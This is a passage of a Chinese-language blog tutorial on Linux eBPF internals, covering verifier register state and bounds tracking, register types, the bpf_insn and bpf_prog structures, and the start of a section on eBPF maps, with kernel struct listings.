class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> &#123;</span><br><span class="hljs-comment">/* 各字段的顺序是重要的.  参见 states_equal() */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_reg_type</span> <span class="hljs-title">type</span>;</span><br><span class="hljs-comment">/* 指针偏移的固定部分, 仅指针类型 */</span><br>s32 off;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-comment">/* 当 type == PTR_TO_PACKET 时可用 */</span><br><span class="hljs-type">int</span> range;<br><br><span class="hljs-comment">/* 当 type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span><br><span class="hljs-comment"> *   PTR_TO_MAP_VALUE_OR_NULL 时可用</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">map_ptr</span>;</span><br><span class="hljs-comment">/* 为了从外部映射中区分映射查找</span><br><span class="hljs-comment"> * map_uid 对于指向内部映射的寄存器为非 0 值</span><br><span class="hljs-comment"> */</span><br>u32 map_uid;<br>&#125;;<br><br><span class="hljs-comment">/* for PTR_TO_BTF_ID */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">btf</span>;</span><br>u32 btf_id;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* for PTR_TO_MEM | PTR_TO_MEM_OR_NULL */</span><br>u32 mem_size;<br>u32 dynptr_id; <span class="hljs-comment">/* for dynptr slices */</span><br>&#125;;<br><br><span class="hljs-comment">/* For dynptr stack slots */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_dynptr_type</span> <span class="hljs-title">type</span>;</span><br><span class="hljs-comment">/* 一个 dynptr 为 16 字节， 故其占用 2 个 stack slots.</span><br><span class="hljs-comment"> * 我们需要追踪哪一个 slot 为第一个防止用户可能尝试传入一个从</span><br><span class="hljs-comment"> * dynptr 的第二个 slot 开始的地址的情况的 slot.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">bool</span> first_slot;<br>&#125; dynptr;<br><br><span class="hljs-comment">/* 以上任意一个的最大尺寸. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> raw1;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> raw2;<br>&#125; raw;<br><br>u32 subprogno; <span class="hljs-comment">/* for PTR_TO_FUNC */</span><br>&#125;;<br><span class="hljs-comment">/* 对于标量类型 (SCALAR_VALUE), 其表示我们对实际值的了解.</span><br><span class="hljs-comment"> * 对于指针类型, 其表示从被指向对象的偏移的可变部分，</span><br><span class="hljs-comment"> * 且同与我们有相同 id 的所有 bpf_reg_states 共享.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var_off</span>;</span><br><span class="hljs-comment">/* 被用于确定任何使用该寄存器的内存访问是否将导致一个坏的访问.</span><br><span class="hljs-comment"> * These refer to the same value as var_off, not necessarily the actual</span><br><span class="hljs-comment"> * contents of the register.</span><br><span class="hljs-comment"> */</span><br>s64 smin_value; <span class="hljs-comment">/* 最小可能值 (s64) */</span><br>s64 smax_value; <span class="hljs-comment">/* 最大可能值 (s64) */</span><br>u64 umin_value; <span class="hljs-comment">/* 最小可能值 (u64) */</span><br>u64 umax_value; <span class="hljs-comment">/* 最大可能值 (u64) */</span><br>s32 s32_min_value; <span class="hljs-comment">/* 最小可能值 (s32) */</span><br>s32 s32_max_value; <span class="hljs-comment">/* 最大可能值 (s32) */</span><br>u32 u32_min_value; <span class="hljs-comment">/* 最小可能值 (u32) */</span><br>u32 u32_max_value; <span class="hljs-comment">/* 最大可能值 (u32) */</span><br><span class="hljs-comment">/* 对于 PTR_TO_PACKET, 用以找到有着相同变量偏移的其他指针，</span><br><span class="hljs-comment"> * 由此他们可以共享范围信息.</span><br><span class="hljs-comment"> * 对于 PTR_TO_MAP_VALUE_OR_NULL 其被用于共享我们来自哪一个映射值</span><br><span class="hljs-comment"> * 当其一被测试于 != NULL.</span><br><span class="hljs-comment"> * 对于 PTR_TO_MEM_OR_NULL 其被用于辨识内存分配以追踪其释放.</span><br><span class="hljs-comment"> * 对于 PTR_TO_SOCKET 其被用于共享哪一个指针保留了对 socket 的相同引用，</span><br><span class="hljs-comment"> * 以确定合适的引用释放.</span><br><span class="hljs-comment"> * 对于作为 dynptrs 的 stack slots, 其被用于追踪对 dynptr的引用</span><br><span class="hljs-comment"> * 以确定合适的引用释放.</span><br><span class="hljs-comment"> */</span><br>u32 id;<br><span class="hljs-comment">/* PTR_TO_SOCKET 与 PTR_TO_TCP_SOCK 可以为一个返回自一个 pointer-cast helper</span><br><span class="hljs-comment"> * bpf_sk_fullsock() 与 bpf_tcp_sock() 的指针 .</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 考虑如下情况， &quot;sk&quot; 为一个返回自 &quot;sk = bpf_sk_lookup_tcp();&quot; 的引用计数指针:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 1: sk = bpf_sk_lookup_tcp();</span><br><span class="hljs-comment"> * 2: if (!sk) &#123; return 0; &#125;</span><br><span class="hljs-comment"> * 3: fullsock = bpf_sk_fullsock(sk);</span><br><span class="hljs-comment"> * 4: if (!fullsock) &#123; bpf_sk_release(sk); return 0; &#125;</span><br><span class="hljs-comment"> * 5: tp = bpf_tcp_sock(fullsock);</span><br><span class="hljs-comment"> * 6: if (!tp) &#123; bpf_sk_release(sk); return 0; &#125;</span><br><span class="hljs-comment"> * 7: bpf_sk_release(sk);</span><br><span class="hljs-comment"> * 8: snd_cwnd = tp-&gt;snd_cwnd;  // verifier 将抗议</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 在第 7 行的 bpf_sk_release(sk) 之后, &quot;fullsock&quot; 指针与</span><br><span class="hljs-comment"> * &quot;tp&quot; 指针都应当被无效化.  为了这么做, 保存 &quot;fullsock&quot; 与 &quot;sk&quot;</span><br><span class="hljs-comment"> * 的寄存器需要记住在 ref_obj_id 中的原始引用计数指针 id(即， sk_reg-&gt;id)</span><br><span class="hljs-comment"> * 这样 verifier 便能重置所有 ref_obj_id 匹配 sk_reg-&gt;id 的寄存器</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * sk_reg-&gt;ref_obj_id 在第 1 行被设为 sk_reg-&gt;id.</span><br><span class="hljs-comment"> * sk_reg-&gt;id 将仅作为 NULL-marking 的目的保持.</span><br><span class="hljs-comment"> * 在 NULL-marking 完成后, sk_reg-&gt;id 可以被重置为 0.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 在第 3 行的 &quot;fullsock = bpf_sk_fullsock(sk);&quot; 之后,</span><br><span class="hljs-comment"> * fullsock_reg-&gt;ref_obj_id 被设为 sk_reg-&gt;ref_obj_id.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 在第 5 行的 &quot;tp = bpf_tcp_sock(fullsock);&quot; 之后,</span><br><span class="hljs-comment"> * tp_reg-&gt;ref_obj_id 被设为 fullsock_reg-&gt;ref_obj_id</span><br><span class="hljs-comment"> * 与 sk_reg-&gt;ref_obj_id 一致.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 从 verifier 的角度而言, 若 sk, fullsock 与 tp 都非 NULL,</span><br><span class="hljs-comment"> * 他们为有着不同 reg-&gt;type 的相同指针.</span><br><span class="hljs-comment"> * 特别地, bpf_sk_release(tp) 也被允许且有着与 bpf_sk_release(sk) </span><br><span class="hljs-comment"> * 相同的影响.</span><br><span class="hljs-comment"> */</span><br>u32 ref_obj_id;<br><span class="hljs-comment">/* 用于存活检查的亲子链 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">parent</span>;</span><br><span class="hljs-comment">/* 在被调用方中两个寄存器可以同时为 PTR_TO_STACK 如同 R1=fp-8 与 R2=fp-8,</span><br><span class="hljs-comment"> * 但其一指向该函数栈而另一指向调用方的栈. 为了区分他们 &#x27;frameno&#x27; 被使用，</span><br><span class="hljs-comment"> * 其为一个指向 bpf_func_state 的 bpf_verifier_state-&gt;frame[] 数组中的下标.</span><br><span class="hljs-comment"> */</span><br>u32 frameno;<br><span class="hljs-comment">/* 追踪子寄存器（subreg）定义. 保存的值为写入 insn 的 insn_idx.</span><br><span class="hljs-comment"> * 这是安全的因为 subreg_def 在任何仅在主校验结束后发生的 insn 修补前被使用.</span><br><span class="hljs-comment"> */</span><br>s32 subreg_def;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_reg_liveness</span> <span class="hljs-title">live</span>;</span><br><span class="hljs-comment">/* if (!precise &amp;&amp; SCALAR_VALUE) min/max/tnum don&#x27;t affect safety */</span><br><span class="hljs-type">bool</span> precise;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="寄存器运行时值与边界范围校验"><a href="#寄存器运行时值与边界范围校验" class="headerlink" title="寄存器运行时值与边界范围校验"></a>寄存器运行时值与边界范围校验</h4><p>eBPF 程序的安全主要是由 verifier 保证的，verifier 会<strong>模拟执行每一条指令</strong>并验证寄存器的值是否合法，主要关注这几个字段：</p><ul><li><code>smin_value</code>、<code>smax_value</code>： 64 位有符号的值的可能取值边界</li><li><code>umin_value</code>、<code>umax_value</code>：64 位无符号的值的可能取值边界</li><li><code>s32_min_value</code>、<code>s32_max_value</code>：32 位有符号的值的可能取值边界</li><li><code>u32_min_value</code>、<code>u32_max_value</code>：32 位无符号的值的可能取值边界</li></ul><p>而寄存器中<strong>可以确定的值</strong>实际上通过 <code>var_off</code> 字段进行表示，该值用一个 <code>tnum</code> 结构体表示，<strong>mask 中为 0 对应的 value 位为已知位</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> &#123;</span><br>u64 value;<br>u64 mask;<br>&#125;;<br></code></pre></td></tr></table></figure><p>一个 verifier 完全未知的寄存器如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">tnum_unknown</span> =</span> &#123; .value = <span class="hljs-number">0</span>, .mask = <span class="hljs-number">-1</span> &#125;;<br></code></pre></td></tr></table></figure><blockquote><p>需要注意的是寄存器边界值是 verifier 通过模拟执行推测出来的，<strong>运行时的寄存器值不一定与 verifier 所推测的一致</strong>，这也曾是很多 eBPF 漏洞产生的原因</p></blockquote><h4 id="寄存器类型"><a href="#寄存器类型" class="headerlink" title="寄存器类型"></a>寄存器类型</h4><p>寄存器在程序运行的不同阶段可能存放着不同类型的值，verifier 通过跟踪寄存器值的类型来防止越界访问的发生，主要有三类：</p><ul><li>未初始化（not init）：寄存器的初始状态，尚未经过任何赋值操作，此类寄存器不能参与运算</li><li>标量值（scalar）：该寄存器被赋予了整型值，此类寄存器不能被作为指针进行内存访问</li><li>指针类型（pointer）：该寄存器为一个指针，verifier 会检查内存访问是否超出指针允许的范围<ul><li>实际上 eBPF 按照用途的不同划分多个不同的指针类型，例如指向栈的指针为 <code>PTR_TO_STACK</code> 类型</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* types of values stored in eBPF registers */</span><br><span class="hljs-comment">/* Pointer types represent:</span><br><span class="hljs-comment"> * pointer</span><br><span class="hljs-comment"> * pointer + imm</span><br><span class="hljs-comment"> * pointer + (u16) var</span><br><span class="hljs-comment"> * pointer + (u16) var + imm</span><br><span class="hljs-comment"> * if (range &gt; 0) then [ptr, ptr + range - off) is safe to access</span><br><span class="hljs-comment"> * if (id &gt; 0) means that some &#x27;var&#x27; was added</span><br><span class="hljs-comment"> * if (off &gt; 0) means that &#x27;imm&#x27; was added</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_reg_type</span> &#123;</span><br>NOT_INIT = <span class="hljs-number">0</span>, <span class="hljs-comment">/* nothing was written into register */</span><br>SCALAR_VALUE, <span class="hljs-comment">/* reg doesn&#x27;t contain a valid pointer */</span><br>PTR_TO_CTX, <span class="hljs-comment">/* reg points to bpf_context */</span><br>CONST_PTR_TO_MAP, <span class="hljs-comment">/* reg points to struct bpf_map */</span><br>PTR_TO_MAP_VALUE, <span class="hljs-comment">/* reg points to map element value */</span><br>PTR_TO_MAP_VALUE_OR_NULL,<span class="hljs-comment">/* points to map elem value or NULL */</span><br>PTR_TO_STACK, <span class="hljs-comment">/* reg == frame_pointer + offset */</span><br>PTR_TO_PACKET_META, <span class="hljs-comment">/* skb-&gt;data - meta_len */</span><br>PTR_TO_PACKET, <span class="hljs-comment">/* reg points to skb-&gt;data */</span><br>PTR_TO_PACKET_END, <span class="hljs-comment">/* skb-&gt;data + headlen */</span><br>PTR_TO_FLOW_KEYS, <span class="hljs-comment">/* reg points to bpf_flow_keys */</span><br>PTR_TO_SOCKET, <span class="hljs-comment">/* reg points to struct bpf_sock */</span><br>PTR_TO_SOCKET_OR_NULL, <span class="hljs-comment">/* reg points to struct bpf_sock or NULL */</span><br>PTR_TO_SOCK_COMMON, <span class="hljs-comment">/* reg points to sock_common */</span><br>PTR_TO_SOCK_COMMON_OR_NULL, <span class="hljs-comment">/* reg points to sock_common or NULL */</span><br>PTR_TO_TCP_SOCK, <span class="hljs-comment">/* reg points to struct tcp_sock */</span><br>PTR_TO_TCP_SOCK_OR_NULL, <span class="hljs-comment">/* reg points to struct tcp_sock or NULL */</span><br>PTR_TO_TP_BUFFER, <span class="hljs-comment">/* reg points to a writable raw tp&#x27;s buffer */</span><br>PTR_TO_XDP_SOCK, <span class="hljs-comment">/* reg points to struct xdp_sock */</span><br><span class="hljs-comment">/* PTR_TO_BTF_ID points to a kernel struct that does not need</span><br><span class="hljs-comment"> * to be null checked by the BPF program. This does not imply the</span><br><span class="hljs-comment"> * pointer is _not_ null and in practice this can easily be a null</span><br><span class="hljs-comment"> * pointer when reading pointer chains. The assumption is program</span><br><span class="hljs-comment"> * context will handle null pointer dereference typically via fault</span><br><span class="hljs-comment"> * handling. The verifier must keep this in mind and can make no</span><br><span class="hljs-comment"> * assumptions about null or non-null when doing branch analysis.</span><br><span class="hljs-comment"> * Further, when passed into helpers the helpers can not, without</span><br><span class="hljs-comment"> * additional context, assume the value is non-null.</span><br><span class="hljs-comment"> */</span><br>PTR_TO_BTF_ID,<br><span class="hljs-comment">/* PTR_TO_BTF_ID_OR_NULL points to a kernel struct that has not</span><br><span class="hljs-comment"> * been checked for null. Used primarily to inform the verifier</span><br><span class="hljs-comment"> * an explicit null check is required for this struct.</span><br><span class="hljs-comment"> */</span><br>PTR_TO_BTF_ID_OR_NULL,<br>PTR_TO_MEM, <span class="hljs-comment">/* reg points to valid memory region */</span><br>PTR_TO_MEM_OR_NULL, <span class="hljs-comment">/* reg points to valid memory region or NULL */</span><br>PTR_TO_RDONLY_BUF, <span class="hljs-comment">/* reg points to a readonly buffer */</span><br>PTR_TO_RDONLY_BUF_OR_NULL, <span class="hljs-comment">/* reg points to a readonly buffer or NULL */</span><br>PTR_TO_RDWR_BUF, <span class="hljs-comment">/* reg points to a read/write buffer */</span><br>PTR_TO_RDWR_BUF_OR_NULL, <span class="hljs-comment">/* reg points to a read/write buffer or NULL */</span><br>PTR_TO_PERCPU_BTF_ID, <span class="hljs-comment">/* reg points to a percpu kernel variable */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="四、eBPF-指令与-eBPF-程序"><a href="#四、eBPF-指令与-eBPF-程序" class="headerlink" title="四、eBPF 指令与 eBPF 程序"></a>四、eBPF 指令与 eBPF 程序</h2><p>eBPF 为 RISC 指令集，单条 eBPF 指令在内核中定义为一个 <code>bpf_insn</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> &#123;</span><br>__u8code;<span class="hljs-comment">/* opcode */</span><br>__u8dst_reg:<span class="hljs-number">4</span>;<span class="hljs-comment">/* dest register */</span><br>__u8src_reg:<span class="hljs-number">4</span>;<span class="hljs-comment">/* source register */</span><br>__s16off;<span class="hljs-comment">/* signed offset */</span><br>__s32imm;<span class="hljs-comment">/* signed immediate constant */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>相应地，一个最简单的 eBPF 程序<strong>便是一个</strong> <code>bpf_insn</code> <strong>结构体数组</strong>，我们可以直接在用户态下编写形如这样的结构体数组来描述一个 eBPF 程序，并作为 eBPF 程序字节码传入内核：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)          \</span><br><span class="hljs-meta">    ((struct bpf_insn) &#123;                                \</span><br><span class="hljs-meta">        .code        = CODE,                            \</span><br><span class="hljs-meta">        .dst_reg     = DST,                             \</span><br><span class="hljs-meta">        .src_reg     = SRC,                             \</span><br><span class="hljs-meta">        .off         = OFF,                             \</span><br><span class="hljs-meta">        .imm         = IMM                              \</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">test_bpf_prog</span>[] =</span> &#123;<br>    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x114514</span>),<br>    BPF_RAW_INSN(BPF_JMP | BPF_EXIT, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>&#125;;<br></code></pre></td></tr></table></figure><p>载入到内核中后，内核最终会使用一个 <code>bpf_prog</code> 结构体来表示一个 eBPF 程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog</span> &#123;</span><br>u16pages;<span class="hljs-comment">/* 分配的页面数量 */</span><br>u16jited:<span class="hljs-number">1</span>,<span class="hljs-comment">/* 我们的 filter 是否是即时编译的? */</span><br>jit_requested:<span class="hljs-number">1</span>,<span class="hljs-comment">/* 架构需要即时编译程序 */</span><br>gpl_compatible:<span class="hljs-number">1</span>, <span class="hljs-comment">/* filter 是否兼容 GPL? */</span><br>cb_access:<span class="hljs-number">1</span>,<span class="hljs-comment">/* 控制块被访问了吗? */</span><br>dst_needed:<span class="hljs-number">1</span>,<span class="hljs-comment">/* 我们是否需要 dst 入口? */</span><br>blinding_requested:<span class="hljs-number">1</span>, <span class="hljs-comment">/* needs constant blinding */</span><span class="hljs-comment">//译注：不知道咋翻</span><br>blinded:<span class="hljs-number">1</span>,<span class="hljs-comment">/* Was blinded */</span><span class="hljs-comment">//译注：瞎了？</span><br>is_func:<span class="hljs-number">1</span>,<span class="hljs-comment">/* 程序为一个 bpf 函数 */</span><br>kprobe_override:<span class="hljs-number">1</span>, <span class="hljs-comment">/* 我们是否在一个 kprobe 之上? */</span><br>has_callchain_buf:<span class="hljs-number">1</span>, <span class="hljs-comment">/* callchain buffer 分配了吗? */</span><br>enforce_expected_attach_type:<span class="hljs-number">1</span>, <span class="hljs-comment">/* 在 attach 时强制执行 expected_attach_type 检查 */</span><br>call_get_stack:<span class="hljs-number">1</span>, <span class="hljs-comment">/* 我们是否调用 bpf_get_stack() 或 bpf_get_stackid() */</span><br>call_get_func_ip:<span class="hljs-number">1</span>, <span class="hljs-comment">/* 我们是否调用 get_func_ip() */</span><br>tstamp_type_access:<span class="hljs-number">1</span>; <span class="hljs-comment">/* 被访问的 __sk_buff-&gt;tstamp_type */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_prog_type</span><span class="hljs-title">type</span>;</span><span class="hljs-comment">/* BPF 程序类型 */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_attach_type</span><span class="hljs-title">expected_attach_type</span>;</span> <span class="hljs-comment">/* 用于一些程序类型 */</span><br>u32len;<span class="hljs-comment">/* filter 块的数量 */</span><br>u32jited_len;<span class="hljs-comment">/* 按字节计的被即时编译的指令大小 */</span><br>u8tag[BPF_TAG_SIZE];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog_stats</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">stats</span>;</span><br><span class="hljs-type">int</span> __percpu*active;<br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">int</span><span class="hljs-params">(*bpf_func)</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *ctx,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_insn *insn)</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog_aux</span>*<span class="hljs-title">aux</span>;</span><span class="hljs-comment">/* 辅助域 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog_kern</span>*<span class="hljs-title">orig_prog</span>;</span><span class="hljs-comment">/* 原始 BPF 程序 */</span><br><span class="hljs-comment">/* 翻译器的指令 */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>DECLARE_FLEX_ARRAY(<span class="hljs-keyword">struct</span> sock_filter, insns);<br>DECLARE_FLEX_ARRAY(<span class="hljs-keyword">struct</span> bpf_insn, insnsi);<br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>其中 <code>bpf_func</code> 函数指针便指向 BPF 字节码经过 JIT 编译生成的汇编代码入口点</p><h2 id="五、eBPF-map"><a href="#五、eBPF-map" class="headerlink" title="五、eBPF map"></a>五、eBPF map</h2><p>bpf map 是一个通用的用以储存不同种类数据的结构，用以在用户进程与 eBPF 程序、eBPF 程序与 eBPF 程序之间进行<strong>数据共享</strong>，这些数据以二进制形式储存，因此用户在创建时只需要指定 key 与 value 的 size</p><p>bpf map 主要有以下五个基本属性：</p><ul><li><code>type</code>：map 的数据结构类型</li><li><code>key_size</code>：以字节为单位的用以索引一个元素的 key 的 size（在数组映射中使用）</li><li><code>value_size</code>：以字节为单位的每个元素的 size</li><li><code>max_entries</code>：map 中 entries 的最大数量</li><li><code>map_flags</code>：描述 map 的独特特征，例如是否整个 map 的内存应被预先分配等</li></ul><p>在内核当中使用一个 <code>bpf_map</code> 结构体表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code 